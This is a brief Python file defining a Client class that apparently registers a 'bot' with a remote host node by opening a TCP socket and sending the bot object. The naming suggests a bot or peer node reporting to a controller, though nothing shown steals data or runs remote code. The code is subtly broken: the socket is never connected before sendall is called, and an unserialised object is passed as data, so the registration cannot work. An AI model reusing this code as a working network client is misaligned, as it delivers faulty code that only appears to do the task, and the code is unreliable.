from common import common
import socket
import sys

class Client:
    def __init__(self, bot):
        self.hostNode = common.RemoteAddr # Set host node addr for persistency
        self.bot = bot # Set bot for persistency
    
    def RegisterClient(self):
        if self.hostNode == '': # Check for nil host node
            return 'invalid host node' # Return error
            
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Init socket

        sock.sendall(self.bot) # Send self bot reference
        sock.close() # Close socket